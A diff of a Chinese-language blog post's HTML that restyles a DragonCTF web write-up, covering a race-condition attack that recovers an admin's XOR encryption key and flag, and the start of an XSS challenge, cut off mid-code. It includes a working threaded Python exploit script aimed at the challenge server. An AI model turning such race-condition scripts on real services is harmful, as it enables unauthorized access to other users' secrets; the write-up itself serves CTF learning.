@@ -145,346 +145,281 @@
           
           
 
-          
-
-<h2 id="3nterprise-s0lution">3NTERPRISE s0lution</h2>
-
-<p>题目直接给出了源码，我已经贴在了 gist 上：<a href="https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6" rel="nofollow noreferrer" target="_blank">https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6</a></p>
-
+          <h2 id="3nterprise-s0lution">3NTERPRISE s0lution</h2>
+<p>题目直接给出了源码，我已经贴在了 gist 上：https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6</p>
 <p>下面来看题目，进来之后是个很明显的 <code>登录</code>/<code>注册</code> 界面，审计完代码后确认题目利用点应该不是此处，那随意注册个名字登录即可：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view1.png" alt="view 1" class="lazyload"><figcaption class="image-caption">view 1</figcaption></figure></p>
-
+<p><img src="/images/posts/DragonCTF-Web-Writeup/view1.png" alt="view 1"></p>
 <p>进入后我们可以看到题目提供的功能，主要有以下两项：</p>
-
 <ol>
 <li>发布一个 note</li>
 <li>查看发布的 note</li>
 </ol>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view2.png" alt="view 2" class="lazyload"><figcaption class="image-caption">view 2</figcaption></figure></p>
-
+<p><img src="/images/posts/DragonCTF-Web-Writeup/view2.png" alt="view 2"></p>
 <p>发布的 note 会被自动分配一个 id，那很自然的想到尝试访问 id 为 1 的页面：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view3.png" alt="view 3" class="lazyload"><figcaption class="image-caption">view 3</figcaption></figure></p>
-
+<p><img src="/images/posts/DragonCTF-Web-Writeup/view3.png" alt="view 3"></p>
 <p>可以看到该页面是由 admin 发布的，但显示的是一段密文，然后页面会进行解密（并得到错误的结果）</p>
-
-<p>查看页面源代码，可以发现执行的是异或加密的解密过程，页面会从 <a href="http://solution.hackable.software:8080/note/getkey" rel="nofollow noreferrer" target="_blank">http://solution.hackable.software:8080/note/getkey</a> 处请求对应的密钥</p>
-
-<pre><code class="language-html">&lt;textarea rows=20 cols=40 id=&quot;note_data&quot;&gt;07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2&lt;/textarea&gt;&lt;br&gt;
-&lt;div id=&quot;konsole&quot;&gt;
-  Note encrypted ... &lt;br&gt;
-&lt;/div&gt;
-&lt;script&gt;
-  var org_content = '';
-  var pos = 0;
-  function ll(msg){ jQuery(&quot;#konsole&quot;).append(&quot;[+] &quot; + msg + &quot;&lt;br&gt;&quot;); }
-  window.setTimeout(function(){ fetch_key() }, 1000)
-  function fetch_key(){
-    ll(&quot;getting key ... &quot;);
-    jQuery.get(
-      &quot;/note/getkey&quot;, 
-      function(data){
-        ll(&quot;got key ...&quot;);
-        window.setTimeout(function(){ decode(data.key); }, 1000)
+<p>查看页面源代码，可以发现执行的是异或加密的解密过程，页面会从 <a href="http://solution.hackable.software">http://solution.hackable.software</a>:8080/note/getkey 处请求对应的密钥</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">20</span> <span style="color:#a6e22e">cols</span><span style="color:#f92672">=</span><span style="color:#e6db74">40</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note_data&#34;</span>&gt;07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2&lt;/<span style="color:#f92672">textarea</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;konsole&#34;</span>&gt;
+  Note encrypted ... &lt;<span style="color:#f92672">br</span>&gt;
+&lt;/<span style="color:#f92672">div</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">org_content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ll</span>(<span style="color:#a6e22e">msg</span>){ <span style="color:#a6e22e">jQuery</span>(<span style="color:#e6db74">&#34;#konsole&#34;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;[+] &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">msg</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>); }
+  window.<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#a6e22e">fetch_key</span>() }, <span style="color:#ae81ff">1000</span>)
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_key</span>(){
+    <span style="color:#a6e22e">ll</span>(<span style="color:#e6db74">&#34;getting key ... &#34;</span>);
+    <span style="color:#a6e22e">jQuery</span>.<span style="color:#a6e22e">get</span>(
+      <span style="color:#e6db74">&#34;/note/getkey&#34;</span>, 
+      <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>){
+        <span style="color:#a6e22e">ll</span>(<span style="color:#e6db74">&#34;got key ...&#34;</span>);
+        window.<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">key</span>); }, <span style="color:#ae81ff">1000</span>)
       }
     )
   }
 
-  function hex_to_ascii(str1){
-    var hex  = str1.toString();
-    var str = '';
-    for (var n = 0; n &lt; hex.length; n += 2) {
-      str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hex_to_ascii</span>(<span style="color:#a6e22e">str1</span>){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hex</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">str1</span>.<span style="color:#a6e22e">toString</span>();
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">n</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">n</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
+      <span style="color:#a6e22e">str</span> <span style="color:#f92672">+=</span> String.<span style="color:#a6e22e">fromCharCode</span>(parseInt(<span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">n</span>, <span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>));
     }
-    return str;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>;
   }
 
-  function decode(key){
-    ll(&quot;decoding ... &quot;);
-    var note = jQuery(&quot;#note_data&quot;)
-    window.hex_content = note.val();
-    window.pos = 0;
-    window.org_content = hex_to_ascii(window.hex_content);
-    window.key_content = hex_to_ascii(key);
-    window.key_len = key.length;
-    window.plaintext = '';
-    note.val('');
-    decode_iter();
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">key</span>){
+    <span style="color:#a6e22e">ll</span>(<span style="color:#e6db74">&#34;decoding ... &#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">note</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jQuery</span>(<span style="color:#e6db74">&#34;#note_data&#34;</span>)
+    window.<span style="color:#a6e22e">hex_content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">val</span>();
+    window.<span style="color:#a6e22e">pos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    window.<span style="color:#a6e22e">org_content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex_to_ascii</span>(window.<span style="color:#a6e22e">hex_content</span>);
+    window.<span style="color:#a6e22e">key_content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex_to_ascii</span>(<span style="color:#a6e22e">key</span>);
+    window.<span style="color:#a6e22e">key_len</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span>;
+    window.<span style="color:#a6e22e">plaintext</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">val</span>(<span style="color:#e6db74">&#39;&#39;</span>);
+    <span style="color:#a6e22e">decode_iter</span>();
   }
-  function decode_iter(){
-    var note = jQuery(&quot;#note_data&quot;);
-    if (window.pos &gt;= window.org_content.length){
-      return ll(&quot;Done !&quot;);
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decode_iter</span>(){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">note</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jQuery</span>(<span style="color:#e6db74">&#34;#note_data&#34;</span>);
+    <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">pos</span> <span style="color:#f92672">&gt;=</span> window.<span style="color:#a6e22e">org_content</span>.<span style="color:#a6e22e">length</span>){
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ll</span>(<span style="color:#e6db74">&#34;Done !&#34;</span>);
     }
-    c1 = window.org_content.charCodeAt(pos);
-    c2 = window.key_content.charCodeAt(pos % window.key_len);
-    c3 = c1 ^ c2;
-    // console.log(c1 + &quot; xor &quot;+ c2 + &quot; = &quot;+ c3); // no loggin on prod !
-    window.plaintext += String.fromCharCode(c3)
-    note.val(window.plaintext + window.hex_content.slice(2+pos*2));
-    window.pos += 1
-    window.setTimeout(function(){decode_iter();}, 120);
+    <span style="color:#a6e22e">c1</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">org_content</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">pos</span>);
+    <span style="color:#a6e22e">c2</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">key_content</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">pos</span> <span style="color:#f92672">%</span> window.<span style="color:#a6e22e">key_len</span>);
+    <span style="color:#a6e22e">c3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c1</span> <span style="color:#f92672">^</span> <span style="color:#a6e22e">c2</span>;
+    <span style="color:#75715e">// console.log(c1 + &#34; xor &#34;+ c2 + &#34; = &#34;+ c3); // no loggin on prod !
+</span><span style="color:#75715e"></span>    window.<span style="color:#a6e22e">plaintext</span> <span style="color:#f92672">+=</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">c3</span>)
+    <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">val</span>(window.<span style="color:#a6e22e">plaintext</span> <span style="color:#f92672">+</span> window.<span style="color:#a6e22e">hex_content</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#a6e22e">pos</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>));
+    window.<span style="color:#a6e22e">pos</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    window.<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){<span style="color:#a6e22e">decode_iter</span>();}, <span style="color:#ae81ff">120</span>);
   }
-&lt;/script&gt;
-</code></pre>
-
-<p>这里就解答了我们之前的疑惑，为什么解密的结果是错误的？因为 admin 的密文是用他的密钥加密的，而直接访问该链接只能得到我们直接的密钥，所以解密的结果必然出错。那么我们现在的目的很明确，获得 admin 用户的加密密钥。</p>
-
+&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>这里就解答了我们之前的疑惑，为什么解密的结果是错误的？因为 admin 的密文是用他的密钥加密的，而直接访问该链接只能得到我们直接的密钥，所以解密的结果必然出错。那么我们现在的目的很明确，获得 admin 用户的加密密钥。</p>
 <p>从源码中，我们可以看到有两种途径来获得 key，第一种是直接调用 <code>/note/getkey</code>，第二种方式则较为间接，我们调用 <code>note/add</code>，然后发送一大段内容为 <code>\x00</code> 的文本，由于异或加密的性质，加密后的密文即加密使用的密钥</p>
-
-<pre><code class="language-python">@app.route(&quot;/note/getkey&quot;)
-@loginzone
-def do_note_getkey():
-  return flask.jsonify(dict(
-    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/note/getkey&#34;</span>)
+<span style="color:#a6e22e">@loginzone</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_note_getkey</span>():
+  <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify(dict(
+    key<span style="color:#f92672">=</span>backend<span style="color:#f92672">.</span>get_key_for_user(flask<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>get(K_AUTH_USER))
   ))
 
-@app.route(&quot;/note/add&quot;, methods=['POST'])
-@loginzone
-def do_note_add_post():
-  text = get_required_params(&quot;POST&quot;, [&quot;text&quot;])[&quot;text&quot;]
-  key = backend.cache_load(flask.session.sid)
-  if key is None:
-    raise WebException(&quot;Cached key&quot;)
-  text = backend.xor_1337_encrypt(
-    data=text,
-    key=key,
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/note/add&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#a6e22e">@loginzone</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_note_add_post</span>():
+  text <span style="color:#f92672">=</span> get_required_params(<span style="color:#e6db74">&#34;POST&#34;</span>, [<span style="color:#e6db74">&#34;text&#34;</span>])[<span style="color:#e6db74">&#34;text&#34;</span>]
+  key <span style="color:#f92672">=</span> backend<span style="color:#f92672">.</span>cache_load(flask<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>sid)
+  <span style="color:#66d9ef">if</span> key <span style="color:#f92672">is</span> None:
+    <span style="color:#66d9ef">raise</span> WebException(<span style="color:#e6db74">&#34;Cached key&#34;</span>)
+  text <span style="color:#f92672">=</span> backend<span style="color:#f92672">.</span>xor_1337_encrypt(
+    data<span style="color:#f92672">=</span>text,
+    key<span style="color:#f92672">=</span>key,
   )
-  note = model.Notes(
-    username=flask.session[K_LOGGED_USER],
-    message=backend.hex_encode(text),
+  note <span style="color:#f92672">=</span> model<span style="color:#f92672">.</span>Notes(
+    username<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>session[K_LOGGED_USER],
+    message<span style="color:#f92672">=</span>backend<span style="color:#f92672">.</span>hex_encode(text),
   )
-  sql_session.add(note)
-  sql_session.commit()
-  add_msg(&quot;Done !&quot;)
-  return do_render()
-</code></pre>
-
-<p>虽然第一种方式更为直接，但后来的测试表明，本题有个很明显的坑在于 key 的长度不止 20 bytes，所以我们必须使用第二种方式来获得 key。</p>
-
-<p>下一步需要思考如何修改加密的密钥，可以看到程序代码中获得密钥的操作是 <code>backend.cache_load</code>，而在程序中恰好有另一个函数可以修改 cache：</p>
-
-<pre><code class="language-python">@app.route('/login/user', methods=['POST'])
-def do_login_user_post():
-  username = get_required_params(&quot;POST&quot;, ['login'])['login']
-  backend.cache_save(
-    sid=flask.session.sid,
-    value=backend.get_key_for_user(username)
+  sql_session<span style="color:#f92672">.</span>add(note)
+  sql_session<span style="color:#f92672">.</span>commit()
+  add_msg(<span style="color:#e6db74">&#34;Done !&#34;</span>)
+  <span style="color:#66d9ef">return</span> do_render()
+</code></pre></div><p>虽然第一种方式更为直接，但后来的测试表明，本题有个很明显的坑在于 key 的长度不止 20 bytes，所以我们必须使用第二种方式来获得 key。</p>
+<p>下一步需要思考如何修改加密的密钥，可以看到程序代码中获得密钥的操作是 <code> backend.cache_load</code>，而在程序中恰好有另一个函数可以修改 cache：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login/user&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_login_user_post</span>():
+  username <span style="color:#f92672">=</span> get_required_params(<span style="color:#e6db74">&#34;POST&#34;</span>, [<span style="color:#e6db74">&#39;login&#39;</span>])[<span style="color:#e6db74">&#39;login&#39;</span>]
+  backend<span style="color:#f92672">.</span>cache_save(
+    sid<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>sid,
+    value<span style="color:#f92672">=</span>backend<span style="color:#f92672">.</span>get_key_for_user(username)
   )
-  state = backend.check_user_state(username)
-  if state &gt; 0:
-    add_msg(&quot;user has {} state code ;/ contact backend admin ... &quot;.format(state))
-    return do_render()
-  flask.session[K_LOGGED_IN] = False
-  flask.session[K_AUTH_USER] = username
+  state <span style="color:#f92672">=</span> backend<span style="color:#f92672">.</span>check_user_state(username)
+  <span style="color:#66d9ef">if</span> state <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+    add_msg(<span style="color:#e6db74">&#34;user has {} state code ;/ contact backend admin ... &#34;</span><span style="color:#f92672">.</span>format(state))
+    <span style="color:#66d9ef">return</span> do_render()
+  flask<span style="color:#f92672">.</span>session[K_LOGGED_IN] <span style="color:#f92672">=</span> False
+  flask<span style="color:#f92672">.</span>session[K_AUTH_USER] <span style="color:#f92672">=</span> username
 
-  return do_302(&quot;/login/auth&quot;)
+  <span style="color:#66d9ef">return</span> do_302(<span style="color:#e6db74">&#34;/login/auth&#34;</span>)
 
-</code></pre>
-
-<p>可以发现我们可以通过传入 <code>login:admin</code> 的方式将 cache 缓存的密钥修改为 admin 所持有的密钥，然后程序从缓存中读取该密钥进而加密内容，我们就能非常顺利的获得密钥了。但在正常情况下先后调用两个函数是不可能的，因为 <code>do_login_user_post</code> 会取消用户的登录状态，所以这里就需要利用竞争。</p>
-
+</code></pre></div><p>可以发现我们可以通过传入 <code>login:admin</code> 的方式将 cache 缓存的密钥修改为 admin 所持有的密钥，然后程序从缓存中读取该密钥进而加密内容，我们就能非常顺利的获得密钥了。但在正常情况下先后调用两个函数是不可能的，因为 <code>do_login_user_post</code> 会取消用户的登录状态，所以这里就需要利用竞争。</p>
 <p>既然我们清楚这道题的考点是条件竞争，那么写代码就是相当容易的一件事情了：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> threading
 
-<pre><code class="language-python">import requests
-import threading
+s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
 
-s = requests.Session()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_login</span>(name):
+    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://solution.hackable.software:8080/login/user&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;login&#39;</span>:name})
 
-def user_login(name):
-    s.post('http://solution.hackable.software:8080/login/user', data={'login':name})
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_auth</span>(password, token):
+    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://solution.hackable.software:8080/login/auth&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;password&#39;</span>:password, <span style="color:#e6db74">&#39;token&#39;</span>: token})
 
-def user_auth(password, token):
-    s.post('http://solution.hackable.software:8080/login/auth', data={'password':password, 'token': token})
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_note</span>():
+    text <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">0x00</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">160</span>
+    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://solution.hackable.software:8080/note/add&#39;</span>,{<span style="color:#e6db74">&#39;text&#39;</span>:text})
 
-def add_note():
-    text = chr(0x00)*160
-    s.post('http://solution.hackable.software:8080/note/add',{'text':text})
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">while</span> True:
+        user_login(<span style="color:#e6db74">&#39;exec&#39;</span>)
+        user_auth(<span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>)
+        t1 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>user_login, args<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;admin&#39;</span>,))
+        t2 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>add_note)
+        t1<span style="color:#f92672">.</span>start()
+        t2<span style="color:#f92672">.</span>start()
 
-def main():
-    while True:
-        user_login('exec')
-        user_auth('exec', 'exec')
-        t1 = threading.Thread(target=user_login, args=('admin',))
-        t2 = threading.Thread(target=add_note)
-        t1.start()
-        t2.start()
-
-if __name__ == '__main__':
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     main()
-</code></pre>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view4.png" alt="view 4" class="lazyload"><figcaption class="image-caption">view 4</figcaption></figure></p>
-
+</code></pre></div><p><img src="/images/posts/DragonCTF-Web-Writeup/view4.png" alt="view 4"></p>
 <p>成功获得 admin 的密钥：<code>4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A</code>，结合密文解密得到 flag：</p>
-
 <pre><code>Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he
-</code></pre>
-
-<h2 id="notepad">Notepad</h2>
-
+</code></pre><h2 id="notepad">Notepad</h2>
 <p>本题是基于 express 框架的 nodejs 程序，后端数据库是 PostgreSQL，不过这些都是次要的，本题考点是 xss。</p>
-
 <p>题目提供了 4 个功能：</p>
-
 <ol>
 <li>注册</li>
 <li>登录</li>
 <li>发布 note</li>
 <li>查看 note</li>
 </ol>
-
 <p>以及你可以 pin 一个 note，或是向管理员报告这个 note，这样管理员就会来查看你发布的 note。</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view5.png" alt="view 5" class="lazyload"><figcaption class="image-caption">view 5</figcaption></figure></p>
-
+<p><img src="/images/posts/DragonCTF-Web-Writeup/view5.png" alt="view 5"></p>
 <p>查看源码，我们可以看到我们之前的输入会以 json 的形式被页面存储，然后页面会调用 <code>notes.js</code> 动态生成相应内容</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bd08c56c76fc48253d0e8dbd7018ec5b&#34;</span>&gt;window.<span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> [{<span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5001</span>,<span style="color:#e6db74">&#34;title&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;test&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;test&#34;</span>,<span style="color:#e6db74">&#34;pinned&#34;</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>}];&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bd08c56c76fc48253d0e8dbd7018ec5b&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/javascripts/notes.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#e6db74">&#39;use strict&#39;</span>;
 
-<pre><code class="language-html">&lt;script nonce=&quot;bd08c56c76fc48253d0e8dbd7018ec5b&quot;&gt;window.notes = [{&quot;id&quot;:5001,&quot;title&quot;:&quot;test&quot;,&quot;content&quot;:&quot;test&quot;,&quot;pinned&quot;:false}];&lt;/script&gt;
-&lt;script nonce=&quot;bd08c56c76fc48253d0e8dbd7018ec5b&quot; src=&quot;/javascripts/notes.js&quot;&gt;&lt;/script&gt;
-</code></pre>
+<span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span>() {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">container</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#notes&#39;</span>);
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#note&#39;</span>).<span style="color:#a6e22e">html</span>();
 
-<pre><code class="language-javascript">'use strict';
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">createNote</span>(<span style="color:#a6e22e">note</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">element</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#a6e22e">template</span>);
+    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.title&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;href&#39;</span>, <span style="color:#e6db74">&#39;/notes/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">id</span>);
+    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.title&#39;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">title</span>);
 
-$(document).ready(function() {
-  var container = $('#notes');
-  var template = $('#note').html();
-
-  function createNote(note) {
-    var element = $(template);
-    element.find('.title').attr('href', '/notes/' + note.id);
-    element.find('.title').html(note.title);
-
-    element.find('.pin').attr('action', '/notes/' + note.id + '/pin');
-    if (note.pinned) {
-      element.find('.pin-text').text('Unpin');
-      element.find('.pin input[name=&quot;value&quot;]').attr('value', '0');
-    } else {
-      element.find('.pin-text').text('Pin');
-      element.find('.pin input[name=&quot;value&quot;]').attr('value', '1');
+    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.pin&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;action&#39;</span>, <span style="color:#e6db74">&#39;/notes/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/pin&#39;</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">pinned</span>) {
+      <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.pin-text&#39;</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">&#39;Unpin&#39;</span>);
+      <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.pin input[name=&#34;value&#34;]&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;value&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+    } <span style="color:#66d9ef">else</span> {
+      <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.pin-text&#39;</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">&#39;Pin&#39;</span>);
